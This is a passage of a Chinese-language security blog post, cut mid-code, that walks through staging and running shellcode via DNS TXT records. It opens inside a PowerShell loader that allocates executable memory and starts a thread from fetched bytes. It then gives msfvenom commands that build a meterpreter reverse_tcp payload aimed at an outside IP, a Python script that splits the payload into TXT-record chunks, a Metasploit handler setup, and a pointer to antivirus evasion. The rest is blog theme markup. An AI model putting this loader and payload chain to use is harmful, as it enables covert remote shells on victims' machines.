[Byte[]]<span class="variable">$sc</span> = <span class="variable">$tmp</span> -split <span class="string">','</span></span><br><span class="line">    <span class="comment">#Code Execution logic</span></span><br><span class="line">  <span class="variable">$code</span> = <span class="string">@"</span></span><br><span class="line"><span class="string">  [DllImport("kernel32.dll")]</span></span><br><span class="line"><span class="string">  public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);</span></span><br><span class="line"><span class="string">  [DllImport("kernel32.dll")]</span></span><br><span class="line"><span class="string">  public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);</span></span><br><span class="line"><span class="string">  [DllImport("msvcrt.dll")]</span></span><br><span class="line"><span class="string">  public static extern IntPtr memset(IntPtr dest, uint src, uint count);</span></span><br><span class="line"><span class="string">"@</span></span><br><span class="line">    <span class="variable">$winFunc</span> = <span class="built_in">Add-Type</span> -memberDefinition <span class="variable">$code</span> -Name <span class="string">"Win32"</span> -namespace Win32Functions -passthru</span><br><span class="line">  <span class="variable">$size</span> = <span class="number">0</span>x1000 </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$sc</span>.Length <span class="nomarkup">-gt</span> <span class="number">0</span>x1000) &#123;<span class="variable">$size</span> = <span class="variable">$sc</span>.Length&#125; </span><br><span class="line">    <span class="variable">$x</span>=<span class="variable">$winFunc::VirtualAlloc</span>(<span class="number">0</span>,<span class="number">0</span>x1000,<span class="variable">$size</span>,<span class="number">0</span>x40) </span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span> <span class="nomarkup">-le</span> (<span class="variable">$sc</span>.Length-<span class="number">1</span>);<span class="variable">$i</span>++) &#123;<span class="variable">$winFunc::memset</span>([IntPtr](<span class="variable">$x</span>.ToInt64()+<span class="variable">$i</span>), <span class="variable">$sc</span>[<span class="variable">$i</span>], <span class="number">1</span>)&#125;</span><br><span class="line">  <span class="keyword">Try</span> &#123;</span><br><span class="line">        <span class="variable">$winFunc::CreateThread</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="variable">$x</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">        sleep <span class="number">100000</span></span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">Catch</span></span><br><span class="line">  &#123;</span><br><span class="line">  [system.exception]</span><br><span class="line">  <span class="string">"caught a system exception"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<blockquote>
+<p>参数说明，<strong>Shelldomain</strong>为创建txt记录的域名或子域名;<strong>subdomains</strong>为创建TXT域名的个数，如上面所创建的为3;<strong>AUTHNS</strong>为域的权威名称服务器，如我使用的狗爹，所以AUTHNS为f1g1ns2.dnspod.net</p>
+</blockquote>
+<p>在32位win7上执行：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\evi1cg\Desktop&gt; . .\Execute-Code.ps1</span><br><span class="line">PS C:\Users\evi1cg\Desktop&gt; Execute-Code -Shelldomain <span class="number">32</span><span class="selector-class">.evi1cg</span><span class="selector-class">.me</span> -subdomains <span class="number">3</span> -AUTHNS f1g1ns2<span class="selector-class">.dnspod</span><span class="selector-class">.net</span></span><br></pre></td></tr></table></figure></p>
+<p>成功获取meterpreter会话：</p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2015/10/3645057492.png" alt="1442639474985.png"></p>
+<p>64位的请自行修改payload及脚本。</p>
+<h2 id="0x04-补充"><a href="#0x04-补充" class="headerlink" title="0x04 补充"></a>0x04 补充</h2><hr>
+<p>Metasploit中已经含有此脚本<a href="https://raw.githubusercontent.com/rapid7/metasploit-framework/master/modules/payloads/singles/windows/dns_txt_query_exec.rb" target="_blank" rel="noopener">dns_txt_query_exec.rb</a>，此脚本查询TXT记录的顺序为a.domain,b.domain…,下面是一个示例，首先生成payload:<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">☁  ~  sudo msfvenom -p windows/meterpreter/reverse_tcp <span class="attribute">LHOST</span>=103.238.225.222 <span class="attribute">LPORT</span>=8887 -e x86/alpha_mixed <span class="attribute">Bufferregister</span>=EDI -f<span class="built_in"> raw </span>&gt; reverse.txt</span><br></pre></td></tr></table></figure></p>
+<p>使用下面的脚本对该文件进行切割：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">txt</span><span class="params">(string,length)</span>:</span></span><br><span class="line">  <span class="keyword">return</span> [string[x:x+length] <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>,len(string),length)]</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'out.txt'</span>,<span class="string">'w+'</span>) <span class="keyword">as</span> f:</span><br><span class="line">  line = open(<span class="string">'reverse.txt'</span>,<span class="string">'r'</span>).read()</span><br><span class="line">  line= txt(line,<span class="number">255</span>)</span><br><span class="line">  <span class="keyword">for</span> txts <span class="keyword">in</span> line:</span><br><span class="line">    f.writelines(txts+<span class="string">'\n\n\n\n'</span>)</span><br></pre></td></tr></table></figure></p>
+<p>输出如下：</p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2015/10/508159428.png" alt="1442643925628.png"></p>
+<p>将这三行分别添加到a.domain,b.domain,c.domain的TXT记录中:</p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2015/10/378494610.png" alt="1442644385883.png"></p>
+<p>生成exe:<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">☁  ~  sudo msfvenom -<span class="selector-tag">p</span> windows/dns_txt_query_exec DNSZONE=evi1cg<span class="selector-class">.me</span> -f exe &gt; test.exe</span><br></pre></td></tr></table></figure></p>
+<p>msf开启监听：<br><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf exploit(handler) &gt; <span class="keyword">set</span> payload <span class="comment">windows</span>/meterpreter/<span class="comment">reverse_tcp</span></span><br><span class="line">payload <span class="comment">=&gt; windows</span>/meterpreter/<span class="comment">reverse_tcp</span></span><br><span class="line">msf <span class="comment">exploit(handler) &gt; set LHOST x.x.x.x</span></span><br><span class="line">LHOST <span class="comment">=&gt; x.x.x.x</span></span><br><span class="line">msf <span class="comment">exploit(handler) &gt; set LPORT 8887</span></span><br><span class="line">LPORT <span class="comment">=&gt; 8887</span></span><br><span class="line">msf <span class="comment">exploit(handler) &gt; exploit</span></span><br></pre></td></tr></table></figure></p>
+<p>运行exe，获得meterpreter:</p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2015/10/3333443320.png" alt="1442644731700.png"></p>
+<p>至于免杀，可以直接生成c格式的shellcode,然后按照<a href="http://zone.wooyun.org/content/22796" target="_blank" rel="noopener">打造免杀payload</a>来做。</p>
+<h2 id="0x05-小结"><a href="#0x05-小结" class="headerlink" title="0x05 小结"></a>0x05 小结</h2><hr>
+<p>本文主要介绍一种执行命令的方式以及nishang的脚本使用，希望能对大家有帮助。</p>
+<hr>
+
+      
+    </div>
+
+    
+
+    <div>
+    
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">------本文结束，感谢阅读------</div>
+    
+</div>
+    
+    </div>
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+      <div>
+        
+
+
+
+  
+
+
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Evi1cg</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    
+    <a href="https://evi1cg.github.io/archives/ExecPowershell_Use_DNSTXT.html" title="通过DNS TXT记录执行powershell">https://evi1cg.github.io/archives/ExecPowershell_Use_DNSTXT.html</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Powershell/" rel="tag"># Powershell</a>
+          
+            <a href="/tags/metasploit/" rel="tag"># metasploit</a>
+          
+            <a href="/tags/dns/" rel="tag"># dns</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/archives/tips.html" rel="next" title="tips">
+                <i class="fa fa-chevron-left"></i> tips
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/archives/Tips_of_Mimikatz.html" rel="prev" title="Mimikatz 使用Tips">
+                Mimikatz 使用Tips <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+
+      
+      
+    </footer>
+
+  
+    <br>
+    <div style="text-align:center" class="addthis_inline_share_toolbox">
+    <script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-5c40967aab5e187f"></script>
+    </div>
+  
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+    <div class="comments" id="comments">
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="https://schema.org/Person">
+            
+            <a href="/">
+              <img class="site-author-image" itemprop="image" src="https://avatars0.githubusercontent.com/u/6007471?s=400&u=58a86031e507e1b49058c9cb52d22dc763e81f9c&v=4#/images/avatar.gif" alt="Evi1cg">
+            
+            </a>
+              <p class="site-author-name" itemprop="name">Evi1cg</p>
+              <p class="site-description motion-element" itemprop="description">此博客主要用来记录自己技术生涯中所学的一些知识,用来分享和备忘。</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archive">
+                
+                    <span class="site-state-item-count">98</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">7</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">51</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://github.com/Ridter" title="GitHub &rarr; https://github.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://twitter.com/Evi1cg" title="Twitter &rarr; https://twitter.com/Evi1cg" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://weibo.com/Ridter" title="微博 &rarr; https://weibo.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>微博</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="mailto:zuotonghk@gmail.com" title="Mail &rarr; mailto:zuotonghk@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>Mail</a>
+                </span>
+              
+            </div>
+          
+
+          
+
+          
+          
+
+          
+            
+          
+          <div id="days"></div>
+<script>
+function show_date_time(){
+window.setTimeout("show_date_time()", 1000);
+BirthDay=new Date("09/17/2015 15:13:14");
+today=new Date();
+timeold=(today.getTime()-BirthDay.getTime());
+sectimeold=timeold/1000
+secondsold=Math.floor(sectimeold);
+msPerDay=24*60*60*1000
+e_daysold=timeold/msPerDay
+daysold=Math.floor(e_daysold);
+e_hrsold=(e_daysold-daysold)*24;
+hrsold=setzero(Math.floor(e_hrsold));
+e_minsold=(e_hrsold-hrsold)*60;
+minsold=setzero(Math.floor((e_hrsold-hrsold)*60));
+seconds=setzero(Math.floor((e_minsold-minsold)*60));
+document.getElementById('days').innerHTML="已运行 "+daysold+" 天 "+hrsold+" 小时 "+minsold+" 分";
+}
+function setzero(i){
+if (i<10)
+{i="0" + i};
+return i;
+}
+show_date_time();
+</script>
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#通过DNS-TXT记录执行powershell"><span class="nav-number">1.</span> <span class="nav-text">通过DNS TXT记录执行powershell</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00简介"><span class="nav-number">1.1.</span> <span class="nav-text">0x00简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01创建TXT记录"><span class="nav-number">1.2.</span> <span class="nav-text">0x01创建TXT记录</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-常见命令"><span class="nav-number">1.2.1.</span> <span class="nav-text">1.常见命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-脚本"><span class="nav-number">1.2.2.</span> <span class="nav-text">2.脚本</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-执行Powershell"><span class="nav-number">1.3.</span> <span class="nav-text">0x02 执行Powershell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-执行命令"><span class="nav-number">1.3.1.</span> <span class="nav-text">1.执行命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-执行脚本"><span class="nav-number">1.3.2.</span> <span class="nav-text">2.执行脚本</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-执行Shellcode"><span class="nav-number">1.4.</span> <span class="nav-text">0x03 执行Shellcode</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-补充"><span class="nav-number">1.5.</span> <span class="nav-text">0x04 补充</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-小结"><span class="nav-number">1.6.</span> <span class="nav-text">0x05 小结</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+    <div style="display: none;"><a href="https://www.whoxy.com/"><img src="//whoxy.s3.amazonaws.com/x.png" alt="whois api"></a></div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2015 – <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Evi1cg</span>
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="//cdn.jsdelivr.net/npm/jquery@2/dist/jquery.min.js"></script>
+
+  
+  <script src="//cdn.jsdelivr.net/npm/fastclick@1/lib/fastclick.min.js"></script>
+
+  
+  <script src="//cdn.jsdelivr.net/npm/jquery-lazyload@1/jquery.lazyload.min.js"></script>
+
+  
+  <script src="//cdn.jsdelivr.net/npm/velocity-animate@1/velocity.min.js"></script>
+
+  
+  <script src="//cdn.jsdelivr.net/npm/velocity-animate@1/velocity.ui.min.js"></script>
+
+  
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+
+
+  
+
+
+  <script src="/js/src/utils.js?v=6.7.0"></script>
+
+  <script src="/js/src/motion.js?v=6.7.0"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/src/affix.js?v=6.7.0"></script>
+
+  <script src="/js/src/schemes/pisces.js?v=6.7.0"></script>
+
+
+
+  
+  <script src="/js/src/scrollspy.js?v=6.7.0"></script>
+<script src="/js/src/post-details.js?v=6.7.0"></script>
+
+
+
+  
+
+
+  <script src="/js/src/bootstrap.js?v=6.7.0"></script>
+
+
+
+  
+  
+
+  
+
+<script src="//cdn.jsdelivr.net/npm/leancloud-storage@3/dist/av-min.js"></script>
+
+
+
+  
+
+<script src="//cdn.jsdelivr.net/npm/valine@1/dist/Valine.min.js"></script>
+
+<script>
+  var GUEST = ['nick', 'mail', 'link'];
+  var guest = 'nick,mail,link';
+  guest = guest.split(',').filter(function(item) {
+    return GUEST.indexOf(item) > -1;
+  });
+  new Valine({
+    el: '#comments',
+    verify: true,
+    notify: true,
+    appId: 's1f976yBJAt2jkwXyp1klYGM-gzGzoHsz',
+    appKey: 'aQhe3medX27hXiDgPHMCjzMB',
+    placeholder: 'ヾﾉ≧∀≦)o来啊，快活啊!',
+    avatar: '',
+    meta: guest,
+    pageSize: '5' || 10,
+    visitor: false
+  });
+   //新增以下代码即可，可以移除.info下所有子节点。
+  var infoEle = document.querySelector('#comments .info');
+  if (infoEle && infoEle.childNodes && infoEle.childNodes.length > 0){
+  infoEle.childNodes.forEach(function(item) {
+    item.parentNode.removeChild(item);
+  });}
+</script>
+
+
+
+
+  
+
+
+  
+
+  <script>
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url).replace(/\/{2,}/g, '/');
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x"></i></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x"></i></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+  <script>
+    (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+      }
+      else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+  <style>
+    .copy-btn {
+      display: inline-block;
+      padding: 6px 12px;
